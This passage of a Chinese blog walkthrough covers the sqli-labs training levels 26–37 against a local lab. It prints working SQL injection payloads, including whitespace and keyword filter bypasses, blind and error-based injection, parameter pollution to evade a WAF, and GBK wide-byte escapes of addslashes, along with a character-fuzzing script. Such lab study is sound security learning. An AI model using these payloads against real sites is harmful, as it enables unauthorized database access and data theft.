class="line">test=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(<span class="built_in">hex</span>(i)))</span><br><span class="line">    tmp=<span class="built_in">str</span>(<span class="built_in">hex</span>(i)).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;%&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(tmp)&lt;<span class="number">3</span>:</span><br><span class="line">        tmp=tmp.replace(<span class="string">&quot;%&quot;</span>,<span class="string">&quot;%0&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(tmp)</span><br><span class="line">    url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-26/?id=1%27%a0oorr&quot;</span>+tmp+<span class="string">&quot;1%a0oorr%20%27&quot;</span></span><br><span class="line">    r=requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Dumb&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        test=test+<span class="string">&quot; &quot;</span>+tmp</span><br><span class="line"><span class="built_in">print</span>(test)</span><br></pre></td></tr></table></figure><p>得到<br><code> %0b %21 %2b %40 %7e %a0</code><br>也可以用隔断，只不过空格替换，关键字替换就可以了<br>参考：<br><a href="https://www.jianshu.com/p/ff72f2c6d99c">Sqli-Labs：Less 26 - Less 26a</a></p><h3 id="level-26a"><a href="#level-26a" class="headerlink" title="level-26a"></a>level-26a</h3><p><strong>时间盲注</strong><br>类似level-26，不过加了括号，以及报错没了,这里用了%00截断，也是对上面的补充</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-26a/?<span class="built_in">id</span>=k<span class="string">&#x27;)%a0oorr%a0if(length(database())=8,sleep(3),1);%00</span></span><br></pre></td></tr></table></figure><h3 id="level-27"><a href="#level-27" class="headerlink" title="level-27"></a>level-27</h3><p><strong>简单过滤绕过-单引号-报错-大小写绕过</strong><br>关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/u 表示按<span class="title function_ invoke__">unicode</span>(utf-<span class="number">8</span>)匹配（主要针对多字节比如汉字）</span><br><span class="line">/i 表示不区分大小写（如果表达式里面有 a， 那么 A 也是匹配对象）</span><br><span class="line">/s 表示将字符串视为单行来匹配</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加单引号<br><code>http://127.0.0.1/sqli-labs/Less-27/?id=1&#39;</code><br>得到报错<br><code>use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</code><br>说明后台就是加了单引号<br>1、union注入，使用大小写绕过，%a0代替空格，%00截断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">27</span>/?<span class="built_in">id</span>=a<span class="string">&#x27;%a0unIon%a0selEct%a01,2,3;%00</span></span><br><span class="line"><span class="string">后端拼接后</span></span><br><span class="line"><span class="string">SELECT * FROM users WHERE id=&#x27;</span>a<span class="string">&#x27;�unIon�selEct�1,2,3;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">回显</span><br><span class="line">Your Login name:<span class="number">2</span></span><br><span class="line">Your Password:<span class="number">3</span></span><br></pre></td></tr></table></figure><p>2、报错注入，使用||替换or，%a0替换空格。%00截断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">27</span>/?<span class="built_in">id</span>=a<span class="string">&#x27;%a0||%a0updatexml(1,concat(0x7e,(database()),0x7e),1);%00</span></span><br></pre></td></tr></table></figure><h3 id="level-27a"><a href="#level-27a" class="headerlink" title="level-27a"></a>level-27a</h3><p><strong>简单过滤绕过-双引号-盲注-大小写绕过</strong><br>类似level-27,不过换了双引号，没了报错<br>1、union注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-27a/?<span class="built_in">id</span>=a<span class="string">&quot;%a0unIon%a0selEct%a01,2,3;%00</span></span><br></pre></td></tr></table></figure><p>2、bool盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-27a/?<span class="built_in">id</span>=a<span class="string">&quot; %a0||%a0if(1,sleep(3),1);%00</span></span><br></pre></td></tr></table></figure><h3 id="level-28"><a href="#level-28" class="headerlink" title="level-28"></a>level-28</h3><p><strong>无报错-单括号-单引号-绕过</strong><br>关键代码   </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function blacklist($<span class="built_in">id</span>)</span><br><span class="line">&#123;</span><br><span class="line">$<span class="built_in">id</span>= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $<span class="built_in">id</span>);//strip out /*</span><br><span class="line">$<span class="built_in">id</span>= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $<span class="built_in">id</span>);//Strip out --.</span><br><span class="line">$<span class="built_in">id</span>= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $<span class="built_in">id</span>);//Strip out <span class="comment">#.</span></span><br><span class="line">$<span class="built_in">id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $<span class="built_in">id</span>);    //Strip out spaces.</span><br><span class="line">//$<span class="built_in">id</span>= preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, $<span class="built_in">id</span>);    //Strip out spaces.</span><br><span class="line">$<span class="built_in">id</span>= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $<span class="built_in">id</span>);    //Strip out spaces.</span><br><span class="line">查找得到，</span><br><span class="line">$<span class="built_in">id</span>= preg_replace(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, $<span class="built_in">id</span>);    //Strip out UNION &amp; SELECT. 这个没看懂什么意思，这句话过滤了相连的union和select，/i同时匹配大小写，\s匹配任意空白字符如制表符、换行符、</span><br><span class="line"><span class="keyword">return</span> $<span class="built_in">id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1、union注入，%a0替换空格，%00截断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">28</span>/?<span class="built_in">id</span>=a<span class="string">&#x27;)%a0union%a0select%a01,2,3;%00</span></span><br><span class="line"><span class="string">后端</span></span><br><span class="line"><span class="string">SELECT * FROM users WHERE id=(&#x27;</span>a<span class="string">&#x27;)�union�select�1,2,3;&#x27;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span> //前面不是过滤union select了吗，但是这里看并没有，空格等，使用%a0可以绕过，%a0不算空白符？</span><br><span class="line">回显</span><br><span class="line">Your Login name:<span class="number">2</span></span><br><span class="line">Your Password:<span class="number">3</span></span><br></pre></td></tr></table></figure><p>2、时间盲注</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">28</span>/?<span class="built_in">id</span>=a<span class="string">&#x27;)%a0||%a0if(length(database())=8,sleep(3),null);%00</span></span><br><span class="line"><span class="string">后端</span></span><br><span class="line"><span class="string">SELECT * FROM users WHERE id=(&#x27;</span>a<span class="string">&#x27;)�||�if(length(database())=3,sleep(3),null);&#x27;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">回显</span><br><span class="line">会sllep <span class="number">3</span> 秒</span><br></pre></td></tr></table></figure><h3 id="level-28a"><a href="#level-28a" class="headerlink" title="level-28a"></a>level-28a</h3><p>关键代码,只过滤了<code>union select</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="built_in">id</span>= preg_replace(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, $<span class="built_in">id</span>);    //Strip out spaces.</span><br></pre></td></tr></table></figure><p>绕过就使用<code> union union select select</code><br>例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-28a/?<span class="built_in">id</span>=a<span class="string">&#x27;) union union select select 1,2,3 %23</span></span><br><span class="line"><span class="string">拼接后</span></span><br><span class="line"><span class="string">SELECT * FROM users WHERE id=(&#x27;</span>a<span class="string">&#x27;) union select 1,2,3 #&#x27;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">回显</span><br><span class="line">Your Login name:<span class="number">2</span></span><br><span class="line">Your Password:<span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="level-29"><a href="#level-29" class="headerlink" title="level-29"></a>level-29</h3><p><strong>WAF简单绕过-参数解析-单引号</strong><br>安装tomcat<br>这里需要安装tomcat提供简单的waf功能<br>在已经jdk的情况下，在tomcat官网下载最新的对应安装包，在此以win为例<br><img src="/2022/02/17/sqli-labs/2022-02-23-18-20-20.png"><br>找个位置解压，然后配置环境变量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在<span class="string">&quot;系统变量&quot;</span>里新建变量名：CATALINA_BASE，变量值：例，D:\JavaEE\apache-tomcat（此处为你的解压包路径）</span><br><span class="line">在<span class="string">&quot;系统变量&quot;</span>里新建变量名：CATALINA_HOME，变量值：同上（此处为你的解压包路径）</span><br></pre></td></tr></table></figure><p>然后在bin下双击startup.bat即可<br>然后访问<a href="http://localhost:8080/">http://localhost:8080/</a><br>可以在conf文件夹里的server.xml修改端口<br><img src="/2022/02/17/sqli-labs/2022-02-23-18-32-21.png"><br>然后下载<a href="https://dev.mysql.com/downloads/connector/j/"><code>mysql-connector-java.jar</code></a>，选择对应版本<br><img src="/2022/02/17/sqli-labs/2022-02-23-18-23-14.png"><br>下载后把压缩包解压的jar包，放到tomcat下的lib<br>然后使用IDEA导入MySQL驱动包，把tomcat加载到IDEA，然后找到lib右键<code>add library</code><br><img src="/2022/02/17/sqli-labs/2022-02-23-18-35-57.png"><br>然后再把sqli-labs下的tomcat-files解压到tomcat的webapps下<br>然后修改level29-32下的index.jsp，把跳转链接改成自己的sli-labs apache服务链接，以我的为例<br><img src="/2022/02/17/sqli-labs/2022-02-23-18-39-57.png"><br>然后就可以测试了<br>关键代码</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">rex</span> <span class="operator">=</span> <span class="string">&quot;^\\d+$&quot;</span>;   \d 匹配数字</span><br><span class="line">Boolean match=id.matches(rex); WAF所在</span><br><span class="line"><span class="keyword">if</span>(match == <span class="literal">true</span>)</span><br></pre></td></tr></table></figure><p>这里绕过的原理是根据tomcat与apache同名参数的的解析方式不同<br>《MySQL注入天书：Less 29》<br><img src="/2022/02/17/sqli-labs/2022-02-23-18-54-43.png"><br>在index.jsp，加入如下代码，查看tomcat解析的id值</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">out.print(<span class="string">&quot;&lt;font color= &#x27;#FFFF00&#x27;&gt;&quot;</span>);</span><br><span class="line">out.print(id);</span><br><span class="line">out.print(<span class="string">&quot;&lt;/font&gt;&quot;</span>);</span><br></pre></td></tr></table></figure><p>例如，index.jsp?id&#x3D;1&amp;id&#x3D;2，在tomcat解析时，id&#x3D;1，而apache下就是2,而apache是我们真正要注入的。<br><img src="/2022/02/17/sqli-labs/2022-02-23-18-59-44.png"><br>可以看到经tomcat解析，id&#x3D;1，而在apache解析后id&#x3D;2,因为<br><img src="/2022/02/17/sqli-labs/2022-02-23-19-02-53.png">   </p><p>就是我们第一个id是正常数据，就可以饶过waf了，第二个id我们就可以发挥想象了<br>仅做简单演示</p><p><img src="/2022/02/17/sqli-labs/2022-02-23-19-06-47.png"></p><p>参考：</p><p><a href="https://www.jianshu.com/p/46cb6c354de5">Sqli-Labs：Less 29 - Less 31</a><br><a href="https://blog.csdn.net/m0_37292262/article/details/80622840">Windows10上安装Apache Tomcat 9 详细教程（亲测绝对有效）</a><br><a href="https://blog.csdn.net/qq_43263647/article/details/105493277?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-1.queryctrv2&spm=1001.2101.3001.4242.2&utm_relevant_index=4">IDEA中导入mysql的驱动jar包</a><br><a href="https://blog.csdn.net/weixin_48557496/article/details/113776824">将驱动mysql-connector-java.jar包导入IDEA</a></p><h3 id="level-30"><a href="#level-30" class="headerlink" title="level-30"></a>level-30</h3><p><strong>WAF简单绕过-参数解析-双引号</strong><br>类似level-29,不深入展示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:<span class="number">9090</span>/sqli-labs/Less-<span class="number">30</span>/?<span class="built_in">id</span>=<span class="number">123</span>&amp;<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&quot;union select 1,2,database()#</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-23-19-18-18.png"></p><h3 id="level-31"><a href="#level-31" class="headerlink" title="level-31"></a>level-31</h3><p><strong>WAF简单绕过-参数解析-双引号-单括号</strong><br>类似level-29,不深入展示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:<span class="number">9090</span>/sqli-labs/Less-<span class="number">31</span>/?<span class="built_in">id</span>=<span class="number">456</span>&amp;<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&quot;) union select 1,2,database()%23</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-23-19-21-23.png"></p><h3 id="level-32"><a href="#level-32" class="headerlink" title="level-32"></a>level-32</h3><p><strong>tomcat，单引号-单括号注入</strong><br>原理和PHP一样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://localhost:<span class="number">9090</span>/sqli-labs/Less-<span class="number">32</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;) union select 1,2,3%23 </span></span><br><span class="line"><span class="string">回显</span></span><br><span class="line"><span class="string">Username: Dumb</span></span><br><span class="line"><span class="string">Password: Username: 2</span></span><br><span class="line"><span class="string">Password: 3</span></span><br></pre></td></tr></table></figure><p><strong>apache ,宽字节注入</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">preg_quote</span>(<span class="string">&#x27;\\&#x27;</span>) .<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;\\\\\\&quot;</span>, <span class="variable">$string</span>);          <span class="comment">//escape any backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>, <span class="variable">$string</span>);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;</span>, <span class="variable">$string</span>);                                <span class="comment">//escape double quote with a backslash</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了 反斜杠\ 单引号 双引号  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(<span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br></pre></td></tr></table></figure><p>将编码设置为 GBK，可能会导致编码问题，MySQL 在使用GBK编码时，会认为两个字符为一个汉字，比如  <code>%bb%5c</code>是一个宽字符（前一个 ASCII 码大于 128 才能到汉字的范围）<a href="#refer-anchor-5"><sup>1</sup></a>，会被认为是一个汉字即 籠。<br>而我们输入单引号 <code>&#39;</code> 即 <code>%27</code>，会被转义成 <code>\&#39;</code> 即  <code>%5c%27</code>，所以哦我们可以构造  <code>%bb%27</code>,被转义后为  <code>%bb%5c%27</code>，即<code>籠&#39;</code>，就饶过了单引号的转义。<br>还有就是利用单引号对单引号的转义，比如<code>\\\\&#39;</code>即<code>\\&#39;</code>  ，构造<code>%bb%5c%5c%%27</code>,转义的时候，会在<code>%5c</code>前加<code>%5c</code>，<code>%27</code>前加<code>%5c</code>即<code>%bb %5c%5c %5c %5c %5c%27</code>，即<code>%bb%5c %5c%5c %5c%5c %27</code>，即籠<code>\\&#39;</code><br>所以就是利用这个特性，把单引号释放出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">32</span>/?<span class="built_in">id</span>=-<span class="number">1</span>%bb%<span class="number">27</span> union select <span class="number">1</span>,<span class="number">2</span>,username <span class="keyword">from</span> users limit <span class="number">2</span>,<span class="number">1</span>%<span class="number">23</span></span><br><span class="line">后端</span><br><span class="line">SELECT * FROM users WHERE <span class="built_in">id</span>=<span class="string">&#x27;-1�\&#x27; union select 1,2,username from users limit 2,1#&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">回显</span><br><span class="line">Your Login name:<span class="number">2</span></span><br><span class="line">Your Password:Dummy</span><br></pre></td></tr></table></figure><p>另一种方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET data</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">32</span>/?<span class="built_in">id</span>=-<span class="number">1</span>%bb%5c%5c%<span class="number">27</span> union select <span class="number">1</span>,<span class="number">2</span>,username <span class="keyword">from</span> users limit <span class="number">2</span>,<span class="number">1</span>%<span class="number">23</span></span><br><span class="line">转义后</span><br><span class="line">SELECT * FROM users WHERE <span class="built_in">id</span>=<span class="string">&#x27;-1�\\\\\&#x27; union select 1,2,username from users limit 2,1#&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">回显</span><br><span class="line">Your Login name:<span class="number">2</span></span><br><span class="line">Your Password:Dummy</span><br></pre></td></tr></table></figure><p><strong>引用：</strong></p><div id="refer-anchor-5"></div><ul><li>[1] <a href="https://www.jianshu.com/p/fa6664786f73">Sqli-Labs：Less 32 - Less 33</a></li></ul><h3 id="level-33"><a href="#level-33" class="headerlink" title="level-33"></a>level-33</h3><p>用的php原生addslashes函数<br>exp和level-32一样</p><h3 id="level-34"><a href="#level-34" class="headerlink" title="level-34"></a>level-34</h3><p><strong>POST型-addslashes过滤-单引号</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=a%bb%27union select <span class="number">1</span>,<span class="number">2</span>%<span class="number">23</span>&amp;passwd=a&amp;submit=Submit</span><br><span class="line">后端</span><br><span class="line">SELECT username, password FROM users WHERE username=<span class="string">&#x27;a»\&#x27;union select 1,2#&#x27;</span> <span class="keyword">and</span> password=<span class="string">&#x27;a&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">回显</span><br><span class="line">&gt;Your Login name:<span class="number">1</span>&lt;br&gt;Your Password:<span class="number">2</span></span><br></pre></td></tr></table></figure><p>还有一种，使用一个utf转码，例如使用 UTF-8 的’转换为 UTF-16 的�’<br>也可以，但是我测试使用%bb 和�的长度一样，而�的ascii是0xfffd，很奇怪，待补充</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line">uname=aý%27union select <span class="number">1</span>,<span class="number">2</span>%<span class="number">23</span>&amp;passwd=a&amp;submit=Submit</span><br><span class="line">拼接后</span><br><span class="line">&gt;SELECT username, password FROM users WHERE username=<span class="string">&#x27;aý\&#x27;union select 1,2#&#x27;</span> <span class="keyword">and</span> password=<span class="string">&#x27;a&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">回显</span><br><span class="line">Your Login name:<span class="number">1</span>&lt;br&gt;Your Password:<span class="number">2</span></span><br></pre></td></tr></table></figure><h3 id="level-35"><a href="#level-35" class="headerlink" title="level-35"></a>level-35</h3><p>用的php原生addslashes函数，而且没有单引号，直接常规注入即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-35/?id=-1 union select 1,2,3%23</span><br></pre></td></tr></table></figure><h3 id="level-36"><a href="#level-36" class="headerlink" title="level-36"></a>level-36</h3><p><strong>mysql_real_escape_string-单引号-报错回显-绕过</strong><br>和前面原理一样<br>mysql_real_escape_string过滤字符如下，也是用反斜杠转义</p><ul><li>\x00</li><li>\n</li><li>\r</li><li>\</li><li>‘</li><li>“</li><li>\x1a  </li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">36</span>/?<span class="built_in">id</span>=-<span class="number">1</span>%bb%<span class="number">27</span><span class="keyword">or</span> <span class="number">1</span>%<span class="number">23</span></span><br><span class="line">后端</span><br><span class="line">SELECT * FROM users WHERE <span class="built_in">id</span>=<span class="string">&#x27;-1�\&#x27;or 1#&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">回显</span><br><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="level-37"><a href="#level-37" class="headerlink" title="level-37"></a>level-37</h3></li></ul><p><strong>POST型-mysql_real_escape_string-单引号-后报错回显-绕过</strong><br>和level-36原理一样，只不过是POST，不细致展开</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST data</span><br><span class="line">uname=a%bb%27union select <span class="number">1</span>,<span class="number">2</span>;<span class="comment">#&amp;passwd=a&amp;submit=Submit</span></span><br><span class="line"></span><br><span class="line">拼接后</span><br><span class="line">SELECT username, password FROM users WHERE username=<span class="string">&#x27;a»\&#x27;union select 1,2;#&#x27;</span> <span class="keyword">and</span> password=<span class="string">&#x27;a&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">回显</span><br><span class="line">Your Login name:<span class="number">1</span>&lt;br&gt;Your Password:<span 